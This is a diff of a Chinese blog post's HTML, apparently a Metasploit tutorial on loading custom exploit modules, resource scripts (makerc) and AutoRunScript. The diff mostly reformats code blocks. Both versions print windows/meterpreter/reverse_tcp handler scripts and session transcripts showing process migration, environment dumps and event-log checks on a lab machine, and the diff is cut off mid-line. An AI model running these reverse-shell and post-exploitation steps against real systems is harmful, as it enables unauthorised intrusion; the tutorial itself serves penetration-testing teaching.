@@ -30,7 +30,7 @@
 <meta property="og:description" content="该文章暂无概述">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-12-10T12:56:00.000Z">
-<meta property="article:modified_time" content="2023-12-09T15:20:38.480Z">
+<meta property="article:modified_time" content="2023-12-17T08:26:09.895Z">
 <meta property="article:author" content="Ghost">
 <meta property="article:tag" content="Metasploit">
 <meta name="twitter:card" content="summary">
@@ -245,7 +245,7 @@ AutoRunScript</span></a></li><li class="nav-item nav-level-3"><a class="nav-link
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-12-09 23:20:38" itemprop="dateModified" datetime="2023-12-09T23:20:38+08:00">2023-12-09</time>
+      <time title="修改时间：2023-12-17 16:26:09" itemprop="dateModified" datetime="2023-12-17T16:26:09+08:00">2023-12-17</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -309,20 +309,14 @@ AutoRunScript</span></a></li><li class="nav-item nav-level-3"><a class="nav-link
 </ul>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211210204046773-485709991.png" /></p>
 <ul>
-<li><p>将自定义的模块放置到了桌面tests文件夹的exploits/z9m8r8_test目录中。将自定义路径载入到Metasploit之后，就可以使用exploit/z9m8r8_test文件中的模块了</p>
-<p>msf5 &gt; loadpath /root/Desktop/tests Loaded 3 modules: 3 exploit
-modules msf5 &gt; use exploit/z9m8r8_test/ use
-exploit/z9m8r8_test/bsplayer2_68_seh_overflow_z9m8r8 use
-exploit/z9m8r8_test/pcman_cwd_z9m8r8_test use
-exploit/z9m8r8_test/php_utility_belt_remote_code_execution msf5 &gt; use
-exploit/z9m8r8_test/</p></li>
+<li>将自定义的模块放置到了桌面tests文件夹的exploits/z9m8r8_test目录中。将自定义路径载入到Metasploit之后，就可以使用exploit/z9m8r8_test文件中的模块了</li>
 </ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; loadpath /root/Desktop/tests</span><br><span class="line">Loaded 3 modules:</span><br><span class="line">3 exploit modules</span><br><span class="line">msf5 &gt; use exploit/z9m8r8_test/</span><br><span class="line">use exploit/z9m8r8_test/bsplayer2_68_seh_overflow_z9m8r8</span><br><span class="line">use exploit/z9m8r8_test/pcman_cwd_z9m8r8_test</span><br><span class="line">use exploit/z9m8r8_test/php_utility_belt_remote_code_execution</span><br><span class="line">msf5 &gt; use exploit/z9m8r8_test/</span><br></pre></td></tr></table></figure>
 <h3 id="reloadedit-和-reload_all-命令">3、reload、edit 和 reload_all
 命令</h3>
 <p>可以使用edit命令动态修改Metasploit中的模块，并在不关闭Metasploit的情况下使用reload命令重新载入编辑过的模块。如果对多个模块进行了修改，就可以在Metasploit中使用reload_all命令一次性载入所有模块。</p>
 <p><strong>示例</strong></p>
-<pre><code>msf5 &gt; use exploit/z9m8r8_test/pcman_cwd_z9m8r8_test
-msf5 exploit(z9m8r8_test/pcman_cwd_z9m8r8_test) &gt; edit</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/z9m8r8_test/pcman_cwd_z9m8r8_test</span><br><span class="line">msf5 exploit(z9m8r8_test/pcman_cwd_z9m8r8_test) &gt; edit</span><br></pre></td></tr></table></figure>
 <p><strong>未改之前</strong></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211210204135159-920433229.png" /></p>
 <p><strong>对作者进行修改</strong></p>
@@ -336,209 +330,39 @@ msf5 exploit(z9m8r8_test/pcman_cwd_z9m8r8_test) &gt; edit</code></pre>
 <p>创建资源脚本有两种方法：手动创建脚本或使用makerc命令创建脚本。</p>
 <p><strong>示例（makerc命令）</strong></p>
 <ul>
-<li><p>makerc命令将之前输入过的所有命令都保存到了一个文件中，可以使用resource命令来使用这个文件</p>
-<p>msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt;
-set payload windows/meterpreter/reverse_tcp payload =&gt;
-windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) &gt; set
-lhost 10.10.10.156 lhost =&gt; 10.10.10.156 msf5 exploit(multi/handler)
-&gt; set lport 4444 lport =&gt; 4444 msf5 exploit(multi/handler) &gt;
-exploit</p>
-<p>[*] Started reverse TCP handler on 10.10.10.156:4444 ^C[-] Exploit
-failed [user-interrupt]: Interrupt [-] exploit: Interrupted msf5
-exploit(multi/handler) &gt; makerc Usage: makerc</p>
-<output rc file>
-<p>Save the commands executed since startup to the specified file.</p>
-<p>msf5 exploit(multi/handler) &gt; makerc multi_hand [*] Saving last 6
-commands to multi_hand ... msf5 exploit(multi/handler) &gt; back msf5
-&gt; resource multi_hand [*] Processing /root/multi_hand for ERB
-directives. resource (/root/multi_hand)&gt; use exploit/multi/handler
-resource (/root/multi_hand)&gt; set payload
-windows/meterpreter/reverse_tcp payload =&gt;
-windows/meterpreter/reverse_tcp resource (/root/multi_hand)&gt; set
-lhost 10.10.10.156 lhost =&gt; 10.10.10.156 resource
-(/root/multi_hand)&gt; set lport 4444 lport =&gt; 4444 resource
-(/root/multi_hand)&gt; exploit</p>
-<p>[*] Started reverse TCP handler on 10.10.10.156:4444</p></li>
+<li>makerc命令将之前输入过的所有命令都保存到了一个文件中，可以使用resource命令来使用这个文件</li>
 </ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 10.10.10.156</span><br><span class="line">lhost =&gt; 10.10.10.156</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.156:4444</span><br><span class="line">^C[-] Exploit failed [user-interrupt]: Interrupt</span><br><span class="line">[-] exploit: Interrupted</span><br><span class="line">msf5 exploit(multi/handler) &gt; makerc</span><br><span class="line">Usage: makerc &lt;output rc file&gt;</span><br><span class="line"></span><br><span class="line">Save the commands executed since startup to the specified file.</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; makerc multi_hand</span><br><span class="line">[*] Saving last 6 commands to multi_hand ...</span><br><span class="line">msf5 exploit(multi/handler) &gt; back</span><br><span class="line">msf5 &gt; resource multi_hand</span><br><span class="line">[*] Processing /root/multi_hand <span class="keyword">for</span> ERB directives.</span><br><span class="line">resource (/root/multi_hand)&gt; use exploit/multi/handler</span><br><span class="line">resource (/root/multi_hand)&gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">resource (/root/multi_hand)&gt; <span class="built_in">set</span> lhost 10.10.10.156</span><br><span class="line">lhost =&gt; 10.10.10.156</span><br><span class="line">resource (/root/multi_hand)&gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">resource (/root/multi_hand)&gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.156:4444</span><br></pre></td></tr></table></figure>
 <h3 id="在-metasploit-中使用-autorunscript">5、在 Metasploit 中使用
 AutoRunScript</h3>
 <p>通过输入set
 AutoRunScript[script-name]来设置AutoRunScript的选项，也可以在资源脚本中直接设置</p>
 <p><strong>示例1</strong></p>
 <ul>
-<li><p><strong>脚本1：multi_script</strong></p>
-<p>root@kali:~# more /root/Desktop/muti_script run
-post/windows/gather/checkvm run post/windows/manage/migrate
-root@kali:~#</p></li>
+<li><strong>脚本1：multi_script</strong></li>
 </ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># more /root/Desktop/muti_script</span></span><br><span class="line">run post/windows/gather/checkvm</span><br><span class="line">run post/windows/manage/migrate</span><br><span class="line">root@kali:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 <p>说明：checkvm（检查目标系统是否运行在虚拟环境的模块）和migrate（将攻击载荷迁移到安全进程的模块）模块自动化的后渗透脚本</p>
 <ul>
-<li><p><strong>脚本2：resource_complete</strong></p>
-<p>root@kali:~# more /root/Desktop/resource_complete use
-exploit/multi/handler set payload windows/meterpreter/reverse_tcp set
-lhost 10.10.10.156 set lport 4444 set AutoRunScript
-multi_console_command -r /root/Desktop/muti_script exploit
-root@kali:~#</p></li>
+<li><strong>脚本2：resource_complete</strong></li>
 </ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># more /root/Desktop/resource_complete</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 10.10.10.156</span><br><span class="line"><span class="built_in">set</span> lport 4444</span><br><span class="line"><span class="built_in">set</span> AutoRunScript multi_console_command -r /root/Desktop/muti_script</span><br><span class="line">exploit</span><br><span class="line">root@kali:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 <p>说明：使用multi_console_command对AutoRunScript进行设置，将multi_console_command设定为-r，这样就允许执行多个后渗透脚本了</p>
 <p><strong>运行测试：</strong></p>
-<pre><code>msf5 &gt; resource /root/Desktop/resource_complete
-[*] Processing /root/Desktop/resource_complete for ERB directives.
-resource (/root/Desktop/resource_complete)&gt; use exploit/multi/handler
-resource (/root/Desktop/resource_complete)&gt; set payload windows/meterpreter/reverse_tcp
-payload =&gt; windows/meterpreter/reverse_tcp
-resource (/root/Desktop/resource_complete)&gt; set lhost 10.10.10.156
-lhost =&gt; 10.10.10.156
-resource (/root/Desktop/resource_complete)&gt; set lport 4444
-lport =&gt; 4444
-resource (/root/Desktop/resource_complete)&gt; set AutoRunScript multi_console_command -r /root/Desktop/muti_script
-AutoRunScript =&gt; multi_console_command -r /root/Desktop/muti_script
-resource (/root/Desktop/resource_complete)&gt; exploit
-
-[*] Started reverse TCP handler on 10.10.10.156:4444
-[*] Sending stage (179779 bytes) to 10.10.10.131
-[*] Meterpreter session 9 opened (10.10.10.156:4444 -&gt; 10.10.10.131:1114) at 2021-10-08 09:03:34 -0400
-[*] Sending stage (179779 bytes) to 10.10.10.131
-[*] Meterpreter session 10 opened (10.10.10.156:4444 -&gt; 10.10.10.131:1117) at 2021-10-08 09:03:49 -0400
-[*] Session ID 9 (10.10.10.156:4444 -&gt; 10.10.10.131:1114) processing AutoRunScript &#39;multi_console_command -r /root/Desktop/muti_script&#39;
-[*] Running Command List ...
-[*] Running command run post/windows/gather/checkvm
-[*] Session ID 10 (10.10.10.156:4444 -&gt; 10.10.10.131:1117) processing AutoRunScript &#39;multi_console_command -r /root/Desktop/muti_script&#39;
-[*] Running Command List ...
-[*] Running command run post/windows/gather/checkvm
-[*] Checking if DH-CA8822AB9589 is a Virtual Machine .....
-[+] This is a VMware Virtual Machine
-[*] Checking if DH-CA8822AB9589 is a Virtual Machine .....
-[*] Running command run post/windows/manage/migrate
-[+] This is a VMware Virtual Machine
-[*] Running command run post/windows/manage/migrate
-[*] Running module against DH-CA8822AB9589
-[*] Current server process: notepad.exe (1768)
-[*] Spawning notepad.exe process to migrate to
-[+] Migrating to 2868
-[+] Successfully migrated to process 2868
-[*] Running module against DH-CA8822AB9589
-[*] Current server process: AcroRd32.exe (2504)
-[*] Spawning notepad.exe process to migrate to
-[+] Migrating to 3936
-meterpreter &gt;</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; resource /root/Desktop/resource_complete</span><br><span class="line">[*] Processing /root/Desktop/resource_complete <span class="keyword">for</span> ERB directives.</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; use exploit/multi/handler</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; <span class="built_in">set</span> lhost 10.10.10.156</span><br><span class="line">lhost =&gt; 10.10.10.156</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; <span class="built_in">set</span> AutoRunScript multi_console_command -r /root/Desktop/muti_script</span><br><span class="line">AutoRunScript =&gt; multi_console_command -r /root/Desktop/muti_script</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.156:4444</span><br><span class="line">[*] Sending stage (179779 bytes) to 10.10.10.131</span><br><span class="line">[*] Meterpreter session 9 opened (10.10.10.156:4444 -&gt; 10.10.10.131:1114) at 2021-10-08 09:03:34 -0400</span><br><span class="line">[*] Sending stage (179779 bytes) to 10.10.10.131</span><br><span class="line">[*] Meterpreter session 10 opened (10.10.10.156:4444 -&gt; 10.10.10.131:1117) at 2021-10-08 09:03:49 -0400</span><br><span class="line">[*] Session ID 9 (10.10.10.156:4444 -&gt; 10.10.10.131:1114) processing AutoRunScript <span class="string">&#x27;multi_console_command -r /root/Desktop/muti_script&#x27;</span></span><br><span class="line">[*] Running Command List ...</span><br><span class="line">[*] Running <span class="built_in">command</span> run post/windows/gather/checkvm</span><br><span class="line">[*] Session ID 10 (10.10.10.156:4444 -&gt; 10.10.10.131:1117) processing AutoRunScript <span class="string">&#x27;multi_console_command -r /root/Desktop/muti_script&#x27;</span></span><br><span class="line">[*] Running Command List ...</span><br><span class="line">[*] Running <span class="built_in">command</span> run post/windows/gather/checkvm</span><br><span class="line">[*] Checking <span class="keyword">if</span> DH-CA8822AB9589 is a Virtual Machine .....</span><br><span class="line">[+] This is a VMware Virtual Machine</span><br><span class="line">[*] Checking <span class="keyword">if</span> DH-CA8822AB9589 is a Virtual Machine .....</span><br><span class="line">[*] Running <span class="built_in">command</span> run post/windows/manage/migrate</span><br><span class="line">[+] This is a VMware Virtual Machine</span><br><span class="line">[*] Running <span class="built_in">command</span> run post/windows/manage/migrate</span><br><span class="line">[*] Running module against DH-CA8822AB9589</span><br><span class="line">[*] Current server process: notepad.exe (1768)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 2868</span><br><span class="line">[+] Successfully migrated to process 2868</span><br><span class="line">[*] Running module against DH-CA8822AB9589</span><br><span class="line">[*] Current server process: AcroRd32.exe (2504)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 3936</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
 <p><strong>示例2</strong></p>
 <ul>
 <li>使用multiscript模块代替multi_console_command模块。来创建一个后渗透脚本</li>
 </ul>
 <p><strong>脚本1：multi_script.rc</strong></p>
-<pre><code>root@kali:~# more /root/Desktop/muti_script.rc
-checkvm
-migrate -n explorer.exe
-get_env
-event_manager -i
-root@kali:~#</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># more /root/Desktop/muti_script.rc</span></span><br><span class="line">checkvm</span><br><span class="line">migrate -n explorer.exe</span><br><span class="line">get_env</span><br><span class="line">event_manager -i</span><br><span class="line">root@kali:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 <p>说明：checkvm（检查目标系统是否运行在虚拟环境的模块）和migrate（将攻击载荷迁移到安全进程的模块）模块自动化的后渗透脚本使用event_manager模块和参数-
 i可以查看目标系统上的所有日志</p>
 <p><strong>脚本2：resource_complete</strong></p>
-<pre><code>root@kali:~# more /root/Desktop/resource_complete
-use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set lhost 10.10.10.156
-set lport 4444
-set AutoRunScript multiscript -r /root/Desktop/muti_script.rc
-exploit
-root@kali:~#</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># more /root/Desktop/resource_complete</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 10.10.10.156</span><br><span class="line"><span class="built_in">set</span> lport 4444</span><br><span class="line"><span class="built_in">set</span> AutoRunScript multiscript -r /root/Desktop/muti_script.rc</span><br><span class="line">exploit</span><br><span class="line">root@kali:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 <p><strong>注意</strong> ：AutoRunScript参数依旧设定为-r</p>
 <p><strong>运行测试：</strong></p>
-<pre><code>msf5 &gt; resource /root/Desktop/resource_complete
-[*] Processing /root/Desktop/resource_complete for ERB directives.
-resource (/root/Desktop/resource_complete)&gt; use exploit/multi/handler
-resource (/root/Desktop/resource_complete)&gt; set payload windows/meterpreter/reverse_tcp
-payload =&gt; windows/meterpreter/reverse_tcp
-resource (/root/Desktop/resource_complete)&gt; set lhost 10.10.10.156
-lhost =&gt; 10.10.10.156
-resource (/root/Desktop/resource_complete)&gt; set lport 4444
-lport =&gt; 4444
-resource (/root/Desktop/resource_complete)&gt; set AutoRunScript multiscript -r /root/Desktop/muti_script.rc
-AutoRunScript =&gt; multiscript -r /root/Desktop/muti_script.rc
-resource (/root/Desktop/resource_complete)&gt; exploit
-
-[*] Started reverse TCP handler on 10.10.10.156:4444
-[*] Sending stage (179779 bytes) to 10.10.10.131
-[*] Meterpreter session 4 opened (10.10.10.156:4444 -&gt; 10.10.10.131:1072) at 2021-10-08 09:37:42 -0400
-[*] Session ID 4 (10.10.10.156:4444 -&gt; 10.10.10.131:1072) processing AutoRunScript &#39;multiscript -r /root/Desktop/muti_script.rc&#39;
-[*] Running Multiscript script.....
-[*] Running script List ...
-[*] running script checkvm
-[!] Meterpreter scripts are deprecated. Try post/windows/gather/checkvm.
-[!] Example: run post/windows/gather/checkvm OPTION=value [...]
-[*] Checking if target is a Virtual Machine .....
-[*] This is a VMware Virtual Machine
-[*] running script migrate -n explorer.exe
-[!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate.
-[!] Example: run post/windows/manage/migrate OPTION=value [...]
-[*] Current server process: AcroRd32.exe (3744)
-[+] Migrating to 1640
-[+] Successfully migrated to process
-[*] running script get_env
-[!] Meterpreter scripts are deprecated. Try post/multi/gather/env.
-[!] Example: run post/multi/gather/env OPTION=value [...]
-[*] Getting all System and User Variables
-
-Enviroment Variable list
-========================
-
-Name Value
----- -----
-APPDATA C:\Documents and Settings\Administrator\Application Data
-CLIENTNAME Console
-ComSpec C:\WINDOWS\system32\cmd.exe
-FP_NO_HOST_CHECK NO
-HOMEDRIVE C:
-HOMEPATH \Documents and Settings\Administrator
-HOMESHARE 仐㰈
-ŗ
-D
-LOGONSERVER \\DH-CA8822AB9589
-NUMBER_OF_PROCESSORS 1
-OS Windows_NT
-PATHEXT .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
-PROCESSOR_ARCHITECTURE x86
-PROCESSOR_IDENTIFIER x86 Family 6 Model 142 Stepping 11, GenuineIntel
-PROCESSOR_LEVEL 6
-PROCESSOR_REVISION 8e0b
-Path C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem
-SESSIONNAME Console
-TEMP C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp
-TMP C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp
-windir C:\WINDOWS
-
-[*] running script event_manager -i
-[*] Retriving Event Log Configuration
-
-Event Logs on System
-====================
-
-Name Retention Maximum Size Records
----- --------- ------------ -------
-Application Disabled 524288K 480
-Security Disabled 524288K 0
-System Disabled 524288K 881
-
-meterpreter &gt; getuid
-Server username: DH-CA8822AB9589\Administrator
-meterpreter &gt; getpid
-Current pid: 1640
-meterpreter &gt; ps
-
-Process List
-============
-
-PID PPID Name Arch Session User Path
---- ---- ---- ---- ------- ---- ----
-0 0 [System Process]
-…………
-1408 676 spoolsv.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\spoolsv.exe
-1640 1620 explorer.exe x86 0 DH-CA8822AB9589\Administrator C:\WINDOWS\Explorer.EXE
-1748 1640 VMwareTray.exe x86 0 DH-CA8822AB9589\Administrator C:\Program Files\VMware\VMware Tools\VMwareTray.exe
-…………
-meterpreter &gt;</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; resource /root/Desktop/resource_complete</span><br><span class="line">[*] Processing /root/Desktop/resource_complete <span class="keyword">for</span> ERB directives.</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; use exploit/multi/handler</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; <span class="built_in">set</span> lhost 10.10.10.156</span><br><span class="line">lhost =&gt; 10.10.10.156</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; <span class="built_in">set</span> AutoRunScript multiscript -r /root/Desktop/muti_script.rc</span><br><span class="line">AutoRunScript =&gt; multiscript -r /root/Desktop/muti_script.rc</span><br><span class="line">resource (/root/Desktop/resource_complete)&gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.156:4444</span><br><span class="line">[*] Sending stage (179779 bytes) to 10.10.10.131</span><br><span class="line">[*] Meterpreter session 4 opened (10.10.10.156:4444 -&gt; 10.10.10.131:1072) at 2021-10-08 09:37:42 -0400</span><br><span class="line">[*] Session ID 4 (10.10.10.156:4444 -&gt; 10.10.10.131:1072) processing AutoRunScript <span class="string">&#x27;multiscript -r /root/Desktop/muti_script.rc&#x27;</span></span><br><span class="line">[*] Running Multiscript script.....</span><br><span class="line">[*] Running script List ...</span><br><span class="line">[*] running script checkvm</span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/checkvm.</span><br><span class="line">[!] Example: run post/windows/gather/checkvm OPTION=value [...]</span><br><span class="line">[*] Checking <span class="keyword">if</span> target is a Virtual Machine .....</span><br><span class="line">[*] This is a VMware Virtual Machine</span><br><span class="line">[*] running script migrate -n explorer.exe</span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate.</span><br><span class="line">[!] Example: run post/windows/manage/migrate OPTION=value [...]</span><br><span class="line">[*] Current server process: AcroRd32.exe (3744)</span><br><span class="line">[+] Migrating to 1640</span><br><span class="line">[+] Successfully migrated to process</span><br><span class="line">[*] running script get_env</span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/gather/env.</span><br><span class="line">[!] Example: run post/multi/gather/env OPTION=value [...]</span><br><span class="line">[*] Getting all System and User Variables</span><br><span class="line"></span><br><span class="line">Enviroment Variable list</span><br><span class="line">========================</span><br><span class="line"></span><br><span class="line">Name Value</span><br><span class="line">---- -----</span><br><span class="line">APPDATA C:\Documents and Settings\Administrator\Application Data</span><br><span class="line">CLIENTNAME Console</span><br><span class="line">ComSpec C:\WINDOWS\system32\cmd.exe</span><br><span class="line">FP_NO_HOST_CHECK NO</span><br><span class="line">HOMEDRIVE C:</span><br><span class="line">HOMEPATH \Documents and Settings\Administrator</span><br><span class="line">HOMESHARE 仐㰈</span><br><span class="line">ŗ</span><br><span class="line">D</span><br><span class="line">LOGONSERVER \\DH-CA8822AB9589</span><br><span class="line">NUMBER_OF_PROCESSORS 1</span><br><span class="line">OS Windows_NT</span><br><span class="line">PATHEXT .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH</span><br><span class="line">PROCESSOR_ARCHITECTURE x86</span><br><span class="line">PROCESSOR_IDENTIFIER x86 Family 6 Model 142 Stepping 11, GenuineIntel</span><br><span class="line">PROCESSOR_LEVEL 6</span><br><span class="line">PROCESSOR_REVISION 8e0b</span><br><span class="line">Path C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem</span><br><span class="line">SESSIONNAME Console</span><br><span class="line">TEMP C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp</span><br><span class="line">TMP C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp</span><br><span class="line">windir C:\WINDOWS</span><br><span class="line"></span><br><span class="line">[*] running script event_manager -i</span><br><span class="line">[*] Retriving Event Log Configuration</span><br><span class="line"></span><br><span class="line">Event Logs on System</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Name Retention Maximum Size Records</span><br><span class="line">---- --------- ------------ -------</span><br><span class="line">Application Disabled 524288K 480</span><br><span class="line">Security Disabled 524288K 0</span><br><span class="line">System Disabled 524288K 881</span><br><span class="line"></span><br><span 